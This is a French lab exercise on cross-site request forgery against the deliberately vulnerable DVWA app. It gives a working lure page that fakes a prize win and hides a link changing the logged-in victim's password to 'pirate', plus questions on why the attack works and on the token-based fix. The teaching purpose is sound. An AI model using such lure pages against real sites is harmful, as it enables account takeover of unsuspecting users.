+++
title = 'CSRF'
weight = '763'
draft = false
+++
-------------

### 1. Analyser la page

Ouvrez **CSRF** et changez le mot de passe pour `test123`. Observez l'URL.

1. Quelle méthode HTTP et quels paramètres sont utilisés ? Le mot de passe actuel est-il demandé ? Le formulaire contient-il une valeur imprévisible ?

### 2. Créer la page piégée

Remettez le mot de passe à `password`. Sur la **VM**, créez `piege.html` (remplacez `<IP_VM>`) :

```html
<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"><title>Concours</title></head>
<body>
  <h1>Félicitations ! Vous avez gagné une tablette !</h1>
  <a href="http://<IP_VM>:4280/vulnerabilities/csrf/?password_new=pirate&password_conf=pirate&Change=Change#">
    Cliquez ici pour réclamer votre prix</a>
</body>
</html>
```

Servez-la depuis la VM :

```bash
python3 -m http.server 8000
```

### 3. Réaliser l'attaque

En restant connecté à DVWA, ouvrez `http://<IP_VM>:8000/piege.html` dans un nouvel onglet et cliquez sur le lien. Déconnectez-vous de DVWA, puis essayez de vous reconnecter avec `password`, puis avec `pirate`.

2. Avec quel mot de passe avez-vous pu vous reconnecter ?
3. La page piégée connaissait-elle votre cookie de session ? Expliquez comment la requête a pu être authentifiée.
4. La page piégée a-t-elle pu **lire** la réponse de DVWA ? Pourquoi ?

### 4. Code corrigé

Consultez le code du niveau **Impossible**.

5. Quelles **deux** protections sont ajoutées ? Associez chacune à une contre-mesure de la section 7.6.
6. Pourquoi l'attaquant ne peut-il pas simplement inclure le jeton anti-CSRF dans sa page ?
7. Quelle autre erreur la page de niveau **Low** commet-elle en utilisant `GET` ?

Arrêtez le serveur Python (**Ctrl+C**) et réinitialisez la base de données.
